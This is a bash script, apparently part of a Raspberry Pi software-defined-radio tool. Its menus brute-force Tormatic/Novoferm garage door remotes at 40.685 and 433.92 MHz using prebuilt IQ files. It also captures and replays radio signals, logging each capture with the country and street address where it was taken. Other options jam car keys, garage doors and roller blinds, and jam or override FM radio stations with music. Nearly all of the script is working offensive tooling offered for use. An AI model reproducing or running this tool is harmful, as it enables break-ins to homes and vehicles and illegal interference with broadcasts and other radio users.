     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute Force Main Button (Recommend) "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force 3 other boutton"
     echo
     printf  "📊 $vert Choose an option : " ;printf $white ;read nuu
     if [[ $nuu = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 40.685MHz   $cyan ⏳ Time: $white 6min $jaune2 1 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/tormatic-40.iq &
     bash timeur.sh 6
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     novoferm
     elif [[ $nuu = 00 ]];then
     novoferm
     elif [[ $nuu = 2 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 40.685MHz   $cyan ⏳ Time: $white 18min $jaune2 3 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/1-tormatic-40.iq &
     bash timeur.sh 18
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     novoferm
     fi


     elif [[ $n = 2 ]];then
      echo -e " $white Tormatic 40          $vert 40MHz " | toilet -f term -F border
      echo -e " $white Tormatic 433         $vert 433MHz " | toilet -f term -F border
      echo
      echo -e "$cyan ⏳ Time for the 2 remotes: $white 9min"
      echo
      echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Press ENTER for start the brute : " ;printf $white ;read nu
     if [[ $nu = ""  ]];then
     echo -e $jaune
     horlogebis
     echo -e $white
     bash timeur.sh 9 &
     sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/tormatic-40.iq
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/tormatic-433.iq
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     novoferm

     elif [[ $nu = 00 ]];then
     novoferm

     else
     novoferm
     fi
     elif [[ $n = 00 ]];then
      brute
     else
     novoferm
     fi


     }
     novoferm

    ;;
  35)function novoferm2(){
     clear
     echo -e $white "$white $rouge3 Novoferm " | toilet -f slant -F border | lolcat
     echo -e $white "$white $noir2 $bleu  Tormatic 433 (Novoferm)" | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge Germany/France     $bleu 📶 frequency: $vert 433.92MHz   $cyan ⏳ Time: $white 3min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force the 2 Tormatic 📲 🔑  "
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute Force Main Button (Recommend) "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force 3 other boutton"
     echo
     printf  "📊 $vert Choose an option : " ;printf $white ;read nuu
     if [[ $nuu = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 433.92MHz   $cyan ⏳ Time: $white 3min $jaune2 1 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/tormatic-433.iq &
     bash timeur.sh 3
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     novoferm2
     elif [[ $nuu = 00 ]];then
     novoferm2
     elif [[ $nuu = 2 ]];then                                                                                                                                       echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 433.92MHz   $cyan ⏳ Time: $white 15min $jaune2 3 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/1-tormatic-433.iq &
     bash timeur.sh 15
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     novoferm2
     fi


     elif [[ $n = 2 ]];then
      echo -e " $white Tormatic 40          $vert 40MHz " | toilet -f term -F border
      echo -e " $white Tormatic 433         $vert 433MHz " | toilet -f term -F border
      echo
      echo -e "$cyan ⏳ Time for the 2 remotes: $white 9min"
      echo
      echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Press ENTER for start the brute : " ;printf $white ;read nu
     if [[ $nu = ""  ]];then
     echo -e $jaune
     horlogebis
     echo -e $white
     bash timeur.sh 9 &
     sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/tormatic-40.iq
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/tormatic-433.iq
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     novoferm2

     elif [[ $nu = 00 ]];then
     novoferm2

     else
     novoferm2
     fi
     elif [[ $n = 00 ]];then
      brute
     else
     novoferm2
     fi


     }
     novoferm2
    ;;

  00)bash $0
    ;;
  *)echo -e $rouge2 "Enter a valid number!❌"
    sleep 1
    brute
    ;;

esac
}

# BEGINNING OF THE SCRIPT
# fonction of beginning of the script
cat .crypt | grep crypter
if [[ $? =  0 ]];then
crypter=$(echo -e $rouge3 "$white $rouge3 Database CRYPTED 🔐 ")
else
crypter=$(echo "")
fi
clear
echo -e $vert "██████╗ ███████╗    ███████╗██╗ ██████╗ ███╗   ██╗ █████╗ ██╗"
echo -e $vert "██╔══██╗██╔════╝    ██╔════╝██║██╔════╝ ████╗  ██║██╔══██╗██║ "
echo -e $vert "██████╔╝█████╗      ███████╗██║██║  ███╗██╔██╗ ██║███████║██║  "
echo -e $vert "██╔══██╗██╔══╝      ╚════██║██║██║   ██║██║╚██╗██║██╔══██║██║  "
echo -e $vert "██║  ██║██║         ███████║██║╚██████╔╝██║ ╚████║██║  ██║███████╗"
echo -e $vert "╚═╝  ╚═╝╚═╝         ╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝"
echo -e $vert2
echo -e  $bleu2 "        $bleu Signal capture📶"  "$blanc  &" "$rouge Brute Force garage🚪" $vert2 | toilet -F border -f term

echo -e  "         $blanc  Number of signals Save:" "$vert $ssignal  $crypter"  | toilet -F border -f term
grep e .INFO > /dev/null
if [[ $? = 0 ]];then
echo -e  "            $rouge[$white i $rouge] ℹ️    $cyan Info to read❗️"
fi
echo
echo -e "$jaune    1️⃣  Signal Capture 🔊"  "$vert (25MHz at 1760MHz)"
echo -e "$jaune    2️⃣  Hack radio station  📻 $vert (Jam and play music 🎵)"
echo -e "$jaune    3️⃣  Jamming car key and garage door 🚗 🏡"
echo -e "$jaune    4️⃣  Brute-Force garage 🔑" "$vert (Known key)"
echo -e "$jaune    5️⃣  Replay a signal from the database 🔁"
echo -e "$jaune    6️⃣  Setting ⚙️ "


echo
printf $bleu
printf "Choose an option : " ;printf $white ;read numero

if [[ $numero == i && -s .INFO ]];then

INFO=$(cat .INFO)
whiptail --title "Info ℹ️   " --msgbox "$INFO" 8 78
sed -i '1d' .INFO
bash $0

elif [[ $numero == 1 ]];then
# Capture the signal and decoding signal
function capture(){
clear
grep e .INFO > /dev/null
if [[ $? = 0 ]];then
echo -e  "            $rouge[$white ℹ️    $rouge] $cyan Info to read on the menu❗" | toilet -f term -F border
fi
echo -e $vert  "  ▄▄▄▄    ▀   $white Decoding 🔓          "
echo -e $vert  " █▀   ▀ ▄▄▄     ▄▄▄▄  ▄ ▄▄    ▄▄▄     █   "
echo -e $vert  " ▀█▄▄▄    █    █▀ ▀█  █▀  █  ▀   █    █   "
echo -e $vert  "     ▀█   █    █   █  █   █  ▄▀▀▀█    █   "
echo -e $vert  " ▀▄▄▄█▀ ▄▄█▄▄  ▀█▄▀█  █   █  ▀▄▄▀█    ▀▄▄ "
echo -e $vert  "                ▄  █                      "
echo -e $white "Capture 📥 $bleu            Replay 📡       " | toilet -f term -F border

echo
echo -e "$white    1️⃣  Capture signal and save to database 🔊"  "$vert (25MHz at 1760MHz)"
echo -e "$white    2️⃣  Signal listening and decoding of known signals" "$vert (Thermostat, Somfy , Ford, Citroên)"
echo
echo -e "                                     $bleu [00] $rouge 🔙" "$white Back"
echo
printf  "📊 $vert Choose an option : " ;printf $white ;read option

if [[ $option = 1 ]];then
cat .crypt | grep crypter > /dev/null
if [[ $? = 0 ]];then
echo "❌ The database is encrypt decrypt the first to be able to record signals ❌" > test_textbox
whiptail --textbox test_textbox 12 60
bash $0
else
clear
echo -e "   $bleu [00] $rouge 🔙" "$white Back"
echo

echo
echo -e "$vert    .;:                                          :;.            "
echo -e "$vert  .;.  :;.                                     :;.  :;.          "
echo -e "$vert .;:  :;   .;;                              :;.  :;.  :;.        "
echo -e "$vert ::   ::   :  $rouge  (( )) $vert        :   ::   ::  "
echo -e "$vert .:.  ;:.  .:. $rouge //_\\ $vert       ::;  .:;  .:;  "
echo -e "$vert  ::.  ':.    $rouge //___\\ $vert      .::  .:;     "
echo -e "$vert   ::.      $rouge  //_____\\ $vert         .:;       "
echo -e "$vert            $rouge //       \\ $vert             "
echo
echo -e $rouge
printf  "📶 Frequency to listen $vert [25MHz at 1760MHz] : " ;printf $white ;read frequence
if [[ $frequence == 00 ]];then
capture
else
echo -e $jaune
horloge
echo -e $vert "Listen on frequency $frequence Mhz"
echo
echo -e $rouge "CONTROL C to stop listening"
echo -e $blanc
sudo rtl_sdr -s 250000 -g 45 -f "$frequence"e6 record.iq
fi
sleep 2
echo -e $rouge
read -p "Do you want to replay the frequency? (Yes/No) :" reponse
case $reponse in
"YES"|"yes"|"Y"|"y")
echo -e $vert "Frequency send 🔜 "
echo
echo -e $blanc
sudo ./sendiq -s 250000 -f "$frequence"e6 -t u8 -i record.iq
echo -e $vert
read -p "Do you want to play again in a loop by pressing a button? (Yes/No)" r
if [[ $r == "Yes" ]] || [[ $r == "yes" ]] || [[ $r == "Y" ]] || [[ $r == "y" ]];then
echo -e $bleu_clair "First record the signal"
read -p "Name of the file :" nom
cp record.iq .Capture/record.iq
sleep 0.4
mv .Capture/record.iq .Capture/$nom-$frequence.iq
echo -e "$cyan Location"
printf  "🚩 Country : " ;printf $vert ;read pays
printf  "🏠 $cyan Street and number (Additional info) :" ;printf $vert ;read rue

echo $date1 $date2 à $date3 > .last
sleep 1.5
echo -e $rouge Capture  "$nom-$frequence.iq enregistred!"
echo -e "$bleu [$signalwc]" "$bleu_clair Name: $rouge $nom" "📶$bleu_clair Frequency:" "$vert $frequence MHz"  "🕗$blanc Captured: $jaune $date1 $date2 at $date3   " | toilet -F border -f term >> .signal
echo -e "🚩$bleu_clair Country: $rouge $pays   🏠 $bleu_clair Street: $white $rue       ℹ️ " | toilet -F border -f term >> .signal
until [[ $r = "oui" ]]
do
  read -p "Press ENTER to send the signal :" r
  echo -e $blanc
  sudo ./sendiq -s 250000 -f "$frequence"e6 -t u8 -i record.iq
  echo
  echo -e "                             $vert Signal finished✅"

  echo -e $rouge "exit to leave the loop ↩️ "
   if [[ $r == "exit" ]]; then
    break
fi
done
capture

else
signal_envoyer
fi
;;
*)
signal_envoyer
;;
esac
fi
elif [[ $option = 2 ]];then
function rtl(){
clear
echo -e "   $bleu [00] $rouge 🔙" "$white Back"
echo -e "   $bleu [i]  $white List known devices"
echo
printf  "📶 Frequency to listen $vert [25MHz at 1760MHz] : " ;printf $white ;read freq

if [[ $freq == 00 ]];then
capture
elif [[ $freq == i ]];then
rtl_433 -R
echo
printf "$vert Press $rouge ENTER $vert to return to the menu: " ;printf $white ;read n
rtl
else
rtl_433 -f $freq
sleep 1
rtl
fi
}
rtl

elif [[ $option = 00 ]];then
bash $0
else
echo -e $rouge2 "Enter a valid number!❌"
sleep 0.5
capture
fi
}
capture

fi

function paramenu(){
#Setting
if [[ $numero = 6 ]];then
function parametre(){
OPTION=$(whiptail --title "Setting" --menu "Choose an option" 15 60 5 \
"1" "Brute Force 🔑" \
"2" "DataBase 📊" \
"3" "Raspberry pi🍓(Serverℹ️ )" \
"4" "Security 📶🔐" \
  3>&1 1>&2 2>&3)

exitstatus=$?
if [ $exitstatus = 1 ];then
bash $0
fi
}
parametre
#Brute-force Option
if [ $OPTION = 1 ]; then
function brute_option(){
OPTION=$(whiptail --title "Brute-Force 🔑" --menu "Choose an option" 15 60 4 \
"1" "Add a remote brand? 📥 " \
  3>&1 1>&2 2>&3)

exitstatus=$?

if [ $OPTION = 1 ];then
echo "Contact me on my email ... 📩" > test_textbox
whiptail --textbox test_textbox 12 60
brute_option
fi
if [ $exitstatus = 1 ];then
paramenu
fi

}
brute_option

#DataBase Option
elif [ $OPTION = 2 ];then
function database_option(){
OPTION=$(whiptail --title "DataBase 📊" --menu "Choose an option" 15 60 4 \
"1" "Encrypt database 🔐" \
"2" "Decrypt the database 🔓" \
"3" "Database storage 🗄  " \
    3>&1 1>&2 2>&3)
exitstatus=$?





if [ $OPTION = 1 ];then
if [ -s .pass ];then
cat .crypt | grep crypter
if [[ $? != 0 ]];then
if (whiptail --title "🔐" --yesno "The database will be invisible for security reasons. Your password will be asked to decrypt the database (Protection of signals 🔊) " 8 60);then
   if [ exitstatus=$? = 1 ];then
   bash $0
   fi
    PASSWORD=$(whiptail --passwordbox "Enter your password" 8 78 --title "🔐" 3>&1 1>&2 2>&3)
    HASH=$(echo $PASSWORD | sha512sum | awk '{print $1}')
    C=$(cat .pass)
    if [ $HASH = $C ];then
    compteur_signal
    aescrypt -e -p $PASSWORD .signal
    rm .signal
    echo crypter > .crypt
    mv .Capture ...
    echo "The database is encrypted 🔐" > test_textbox
    whiptail --textbox test_textbox 10 60
    database_option


    else
    echo "Invalid password check it! ❌" > test_textbox
    whiptail --textbox test_textbox 10 60
    database_option
    fi



fi
else
   echo "The database is already encrypted! ❌" > test_textbox
   whiptail --textbox test_textbox 10 60
    database_option

fi
else
echo "First choose a password in => Security 📶🔐 " > test_textbox
whiptail --textbox test_textbox 12 60
database_option

fi
fi

if [ $exitstatus = 1 ];then
paramenu
fi

if [ $OPTION = 3 ];then
c=$(du -h .Capture | awk '{print $1}');s=$(ls .Capture | wc -l); echo "Database storage : $c                                         Number of signal capture: $s/100" > test_textbox
whiptail --textbox test_textbox 10 60
database_option
fi
if [ $OPTION = 2 ];then
cat .crypt | grep crypter
if [[ $? != 0 ]];then
echo "The database is already decrypted 🔓" > test_textbox
whiptail --textbox test_textbox 12 60
database_option
else
PASSWORD=$(whiptail --passwordbox "Enter the password!" 8 78 --title "🔐" 3>&1 1>&2 2>&3)
HASH=$(echo $PASSWORD | sha512sum | awk '{print $1}')
C=$(cat .pass)
if [ $HASH = $C ];then
aescrypt -d -p $PASSWORD .signal.aes
rm .signal.aes
mv ... .Capture
echo "" > .crypt
signal=$(ls .Capture | wc -l)
echo "Database is decrypt ✅ =>                        $signal signal have been found 🔊" > test_textbox
whiptail --textbox test_textbox 12 60
database_option

else
echo "Bad password ❌" > test_textbox
whiptail --textbox test_textbox 8 60
database_option
fi
fi
fi
}
database_option

#Raspberry Option
elif [ $OPTION = 3 ];then
function raspberry_option(){
OPTION=$(whiptail --title "Raspberry pi 🍓" --menu "Choose an option" 15 60 4 \
"1" "Info SDR 🔊 " \
"2" "Storage 🗄 " \
"3" "Reboot Pi 🔄 " \
  3>&1 1>&2 2>&3)
exitstatus=$?


if [ $exitstatus = 1 ];then
paramenu
fi
if [ $OPTION = 1 ];then

lsusb | grep RTL | toilet -f term -F border;cat .sdr > test_textbox
whiptail --textbox test_textbox 30 60
raspberry_option
fi
if [ $OPTION = 2 ];then
un=$(df -h | grep /dev/root | awk '{print $2}')
deux=$(df -h | grep /dev/root | awk '{print $3}')
trois=$(df -h | grep /dev/root | awk '{print $4}')
quatre=$(df -h | grep /dev/root | awk '{print $5}')
echo "TOTAL: $un    USE:  $deux  AVAIBLE:  $trois  =>  $quatre " > test_textbox
whiptail --textbox test_textbox 10 60
raspberry_option
fi
if [ $OPTION = 3 ];then
if (whiptail --title "🚫" --yes-button "YES" --no-button "NO" --yesno "Do you really want to restart the Raspberry? " 8 60);then
sudo reboot
echo "Restarting the Raspberry Pi in progress 🔄"> test_textbox
whiptail --textbox test_textbox 8 60

else
raspberry_option
fi
fi
}
raspberry_option

#Security Option
elif [ $OPTION = 4 ];then
function securite_option(){
OPTION=$(whiptail --title "Security 📶" --menu "Choose an option" 15 60 4 \
"1" "Password" \
"2" "Change password" \
""  "" \
  3>&1 1>&2 2>&3)
exitstatus=$?


if [ $exitstatus = 1 ];then
paramenu
fi
if [ $OPTION = 1 ];then
if [ -s .pass ];then
echo "The password has already been chosen modify it to change it! ✅" > test_textbox
whiptail --textbox test_textbox 10 60
securite_option

else
unset PASSWORD2
PASSWORD=$(whiptail --passwordbox "Choose your password" 8 78 --title "🔐" 3>&1 1>&2 2>&3)
PASSWORD2=$(whiptail --passwordbox "Confirm your password" 8 78 --title "🔐" 3>&1 1>&2 2>&3)
if [ $PASSWORD = $PASSWORD2 ];then
echo $PASSWORD2 | sha512sum | awk '{print $1}' > .pass
echo "password add ✅"                  "It will be used to decrypt the database!" > test_textbox
whiptail --textbox test_textbox 10 60
securite_option
else
echo "Invalid password check it! ❌" > test_textbox
whiptail --textbox test_textbox 10 60
securite_option
fi
fi
fi
if [ $OPTION = 2 ];then
if [ -s .pass ];then
PASSWORD=$(whiptail --passwordbox "Enter the old password first to confirm" 8 78 --title "🔐" 3>&1 1>&2 2>&3)
HASH=$(echo $PASSWORD | sha512sum | awk '{print $1}')
C=$(cat .pass)
if [ $HASH = $C ];then
coi=$(cd .Capture > /dev/null)
$coi
if [ $? = 1 ];then
aescrypt -d -p $PASSWORD .signal.aes
rm .signal.aes
fi

PASSWORD=$(whiptail --passwordbox "Choose your new password" 8 78 --title "🔐" 3>&1 1>&2 2>&3)
PASSWORD2=$(whiptail --passwordbox "Confirm your new password" 8 78 --title "🔐" 3>&1 1>&2 2>&3)
cois=$(cd .Capture > /dev/null)
$cois
if [ $? = 1 ];then
aescrypt -e -p $PASSWORD2 .signal
rm .signal
fi

else
echo "The password does not match the hash try again ❌" > test_textbox
whiptail --textbox test_textbox 10 60
securite_option
fi
if [ $PASSWORD = $PASSWORD2 ];then
echo $PASSWORD2 | sha512sum | awk '{print $1}' > .pass
echo "Password add ✅"                  "It will be used to decrypt the database" > test_textbox
whiptail --textbox test_textbox 10 60
securite_option
else
echo "Bad password ❌" > test_textbox
whiptail --textbox test_textbox 10 60
securite_option
fi
else
echo "You haven't chosen a password yet! ❌" > test_textbox
whiptail --textbox test_textbox 10 60
securite_option
fi
fi
}
securite_option
fi
fi
}
paramenu


if [[ $numero == 5 ]];then
#function Database
info
function database (){
clear

echo -e $jaune  "┌────────────────────────────────────────────────────────┐"
echo -e $jaune  "│                                                        │"
echo -e $jaune  "│ ▄▄▄▄            ▄           ▄▄▄▄▄                      │"
echo -e $jaune  "│ █   ▀▄  ▄▄▄   ▄▄█▄▄   ▄▄▄   █    █  ▄▄▄    ▄▄▄    ▄▄▄  │"
echo -e $jaune  "│ █    █ ▀   █    █    ▀   █  █▄▄▄▄▀ ▀   █  █   ▀  █▀  █ │"
echo -e $jaune  "│ █    █ ▄▀▀▀█    █    ▄▀▀▀█  █    █ ▄▀▀▀█   ▀▀▀▄  █▀▀▀▀ │"
echo -e $jaune  "│ █▄▄▄▀  ▀▄▄▀█    ▀▄▄  ▀▄▄▀█  █▄▄▄▄▀ ▀▄▄▀█  ▀▄▄▄▀  ▀█▄▄▀ │"
echo -e $jaune  "│                                                        │"
echo -e $jaune  "│                                                        │"
echo -e $jaune  "└────────────────────────────────────────────────────────┘"
grep crypter .crypt > /dev/null
if [ $? = 0 ];then
echo -e $rouge3 "$white $rouge3 DataBase CRYPTED 🔐 " | toilet -f term -F border
fi

echo
echo -e "$rouge Number of signal capture:" "$vert $ssignal/100"  "$blanc last Capture: $vert $last"
grep e .INFO > /dev/null
if [[ $? = 0 ]];then
echo -e  "            $rouge[$white ℹ️    $rouge] $cyan Info to read on the menu❗" | toilet -f term -F border
fi
echo
echo
echo -n "$signall"
echo
echo
echo -e "$bleu [i] ℹ️   $white Info database"
echo -e "$bleu [X] $rouge2 ❌ $white Delete signal                      $bleu [00] $rouge 🔙" "$white Back" 

echo -e $rouge
printf "Enter the number of the signal you want to play: " ;printf $vert ;read num
chiffre=$(cat -n .signal | awk '{print $1 $3}' | fgrep [$num] | cut -c 1,2 | grep -o "^[0-9]\+")
nom=$(sed -n "$chiffre p" .signal | awk '{print $6}')
inexistant=$(cat .signal | awk '{print $2}' | fgrep [$num])
if [[ $num == "00" ]];then
clear
bash $0
elif [[ $num == "i" ]];then
c=$(du -h .Capture | awk '{print $1}');s=$(ls .Capture | wc -l); echo "Storage of the database : $c                                         Nomber of signal capture: $s/100" > test_textbox
whiptail --textbox test_textbox 10 60
database
elif [[ $num == "X" ]];then
printf "Enter the number of the signal you want to delete?: " ;printf $white ;read nu

chiffre=$(cat -n .signal | awk '{print $1 $3}' | fgrep [$nu] | cut -c 1,2 | grep -o "^[0-9]\+")
nom=$(sed -n "$chiffre p" .signal | awk '{print $6}')
nomsignal=$(ls .Capture | grep $nom)
inexistant2=$(cat .signal | awk '{print $2}' | fgrep [$nu])
if [[ $nu != $inexistant2  ]];then
echo -e $rouge2 "Enter a valid number!❌"
sleep 1
database
else
if (whiptail --title "Do you really want to suppress the signal $nomsignal?" --yes-button "YES" --no-button "NO" --yesno "If YES you will lose the signal forever" 10 60)
then
sleep 0.5
rm .Capture/$nomsignal
chiffreplus=$(echo $chiffre + 4 | bc)
chiffremoin=$(echo $chiffre - 1 | bc)
sed -i  " $chiffremoin , $chiffreplus d " .signal
echo -e $white
horloge
echo -e " $bleu the signal $rouge $nomsignal $bleu is delete!🗑"
sleep 3
bash $0
else
echo -e $white
horloge
echo -e $rouge2 "$white The signal was not deleted❗️"
sleep 1
unset nu
database
fi
fi
elif [[ $(cat .signal | awk '{print $2}' | fgrep [$num] > /dev/null;echo $?) != 0 ]];then
echo -e $rouge2 "Enter a valid number!❌"
sleep 1
database
elif [[ $num == $num ]];then
frequencce=$(sed -n "$chiffre p" .signal | awk '{print $10}')
echo -e "$bleu_clair Send signal $vert $nom.iq🔜 " | toilet -f term -F border
echo -e "$bleu_clair 📶 Frequency: $vert $frequencce MHz" | toilet -f term -F border
sleep 1
ls .Capture | grep $nom | grep -o "^[0-9]\+"
echo -e $vert
horlogebis
sudo ./sendiq -s 250000 -f "$frequencce"e6 -t u8 -i .Capture/$nom-$frequencce.iq
sleep 1
echo
echo -e "                           $vert Signal finished✅️"
echo -e $rouge
read -p "Do you want to loop the signal again by pressing a button? (Yes/No)" r
if [[ $r == "Yes" ]] || [[ $r == "yes" ]] || [[ $r == "Y" ]] || [[ $r == "y" ]];then
until [[ $r = "yes" ]]
do
  read -p "Press ENTER to send the signal :" r
  echo -e $blanc
 sudo ./sendiq -s 250000 -f "$frequencce"e6 -t u8 -i .Capture/$nom-$frequencce.iq
 echo
 echo -e "                      $vert Signal finished✅️"
 echo
  echo -e $rouge "exit to leave the loop ↩️ "
  if [[ $r == "exit" ]]; then
    break
fi
done
database
else
database
fi
else
echo -e $rouge2 "Enter a valid number!❌"
sleep 1
database
fi
}
database

elif [[ $numero == "4" ]];then
brute

elif [[ $numero == 2 ]];then
function radio(){
clear
lastaudio=$(cat .lastaudio)
audio=$(ls .song | wc -l)
echo -e $white $noire2 $vert "Hack" | toilet -f term -F border
 echo -e $violet "▄▄▄▄▄             █    ▀"
 echo -e $violet "█   ▀█  ▄▄▄    ▄▄▄█  ▄▄▄     ▄▄▄"
 echo -e $violet "█▄▄▄▄▀ ▀   █  █▀ ▀█    █    █▀ ▀█"
 echo -e $violet "█   ▀▄ ▄▀▀▀█  █   █    █    █   █"
 echo -e $violet "█    ▀ ▀▄▄▀█  ▀█▄██  ▄▄█▄▄  ▀█▄█▀📻"
echo
echo -e "$rouge Number of Audio to play:" "$vert $audio/100"  "$blanc Last Audio Played: $vert $lastaudio" | toilet -f term -F border
echo
grep e .INFO > /dev/null
if [[ $? = 0 ]];then
echo -e  "            $rouge[$white ℹ️    $rouge] $cyan Info to read on the menu❗" | toilet -f term -F border
echo
fi
echo -e $white  "1️⃣  Jamming stations $rouge FM $vert radio📡/ morse bip..."🎙
echo -e $white  "2️⃣  Play music  🎶"
echo -e $white  "3️⃣  Choose the frequency"
echo
echo
echo -e "                                   $bleu [00] $rouge 🔙" "$white Back"
echo -e $violet
printf "Chooe an option: " ;printf $white ;read numi
if [[ $numi == 1 ]];then
function radio_jam(){
clear
INPU_FREQ=$(cat .INPUT_FREQ)
echo -e $violet "       Frequency chosen: $white $INPU_FREQ $vert Mhz        "
echo
echo -e $white "1️⃣  Completely jam the radio station  "
echo -e $white "2️⃣  Greasing the radio station"
echo -e $white "3️⃣  Choose the frequency"
echo
echo -e "                                   $bleu [00] $rouge 🔙" "$white Back"
echo -e $violet
printf "Choose an option: " ;printf $white ;read numis

if [[ $numis == 1 ]];then
echo -e $violet
horlogebis
echo -e $jaune "Jamming the frequency $white $INPU_FREQ $vert Mhz" | toilet -f term -F border
sudo ./tune -f "$INPU_FREQ"e6
radio_jam
elif [[ $numis == 2 ]];then
echo -e $violet
horlogebis
echo -e $cyan "Morse signals are sent which will jitter the frequency ℹ️️"
echo -e $jaune "Frequency tremor $white $INPU_FREQ $vert Mhz" | toilet -f term -F border
sudo ./piopera F5OEO 1 "$INPU_FREQ"e6
radio_jam

elif [[ $numis == 3 ]];then
INPUT_FREQ=$(whiptail --inputbox "Choose your frequency (in MHZ) " 8 78 --title "RTL-SDR receving" 3>&1 1>&2 2>&3)
echo $INPUT_FREQ > .INPUT_FREQ
radio_jam

elif [[ $numis == 00 ]];then
radio
else
echo -e $rouge2 "Enter a valid number!❌"
radio_jam
fi
}
radio_jam

elif [[ $numi == 3 ]];then
INPUT_FREQ=$(whiptail --inputbox "Choose your frequency (in MHZ) " 8 78 --title "RTL-SDR receving" 3>&1 1>&2 2>&3)
echo $INPUT_FREQ > .INPUT_FREQ
radio
elif [[ $numi == 2 ]];then
function radio_music(){
clear
INPU_FREQ=$(cat .INPUT_FREQ)
echo -e $violet "                          Chosen frequency: $white $INPU_FREQ $vert Mhz        "
echo -e "$rouge Number of Audio to play:" "$vert $audio/100"  "$blanc Last Audio Played: $vert $lastaudio" | toilet -f term -F border
echo
ls .song | sort -n | cat -n
echo
echo -e "                                   $bleu [00] $rouge 🔙" "$white Back"
echo -e $violet
printf "Choose an option: " ;printf $white ;read numii

NUM=$(ls .song | sort -n | cat -n | grep $numii)
SONG=$(ls .song | sort -n | cat -n | grep $numii | awk '{print $2}')

if [[ $numii == 00 ]];then
radio
elif [[ $numii == $numii ]];then
echo -e $violet
horlogebis
echo -e $jaune "Send audio: $white $SONG $violet in $white $INPU_FREQ $vert Mhz " | toilet -f term -F border
echo $date1 $date2 à $date3 > .lastaudio
sudo ./fm_transmitter -f $INPU_FREQ .song/$SONG
radio_music

elif [[ $numii != $NUM ]];then
echo -e $rouge2 "Enter a valid number!❌"
fi
}
radio_music

elif [[ $numi == 00 ]];then
bash $0
else
echo -e $rouge2 "Enter a valid number!❌"
sleep 1
radio

fi

}
radio

elif [[ $numero == 3 ]];then
function jam(){
clear
FRREQ=$(cat .FREQ)
lastjam=$(cat .lastjam)
echo -e $vert2 $vert2 $white $noir "SIGNAL" | toilet -f term -F border
echo -e $vert " 📡 ▄▄▄            🏠"
echo -e $vert "      █   ▄▄▄   ▄▄▄▄▄"
echo -e $vert "      █  ▀   █  █ █ █"
echo -e $vert "      █  ▄▀▀▀█  █ █ █"
echo -e $vert "  ▀▄▄▄▀  ▀▄▄▀█  █ █ █🚘🚙"
echo -e $cyan "Car jammer, Garage door, Roller blind... " | toilet -f term -F border
echo -e $jaune "Chosen frequency: $white $FRREQ $vert Mhz" "$blanc Last jam played: $vert $lastjam" | toilet -f term -F border
echo
grep e .INFO > /dev/null
if [[ $? = 0 ]];then
echo -e  "            $rouge[$white ℹ️    $rouge] $cyan Info to read on the menu❗" | toilet -f term -F border
echo
fi

echo -e $white  "1️⃣  Jamming the signal 🔇"
echo -e $white  "2️⃣  Choose frequency "
echo -e $white  "3️⃣  List Known Frequencies  ℹ️"
echo
echo
echo -e "                                   $bleu [00] $rouge 🔙" "$white Back"
echo -e $violet
printf "Choose an option: " ;printf $white ;read n
if [[ $n == 1 ]];then
echo -e $vert
horlogebis
echo -e $jaune "Jamming the frequency $white $FRREQ $vert Mhz" | toilet -f term -F border
echo $date1 $date2 à $date3 > .lastjam
sudo ./tune -f "$FRREQ"e6
jam
elif [[ $n == 2 ]];then
FREQ=$(whiptail --inputbox "Choose the frequency (in MHZ) " 8 78 --title "RTL-SDR Jamming" 3>&1 1>&2 2>&3)
echo $FREQ > .FREQ
jam
elif [[ $n == 3 ]];then
cat .jam-frequency.txt
echo -e $vert
printf "Press $rouge ENTER $vert to return to the menu: " ;printf $white ;read n
jam
elif [[ $n == 00 ]];then
bash $0
else
echo -e $rouge2 "Enter a valid number!❌"
jam
fi
}
jam

else
echo -e $rouge2 "Enter a valid number!❌"
sleep 1
clear
supp_test
bash $0
fi

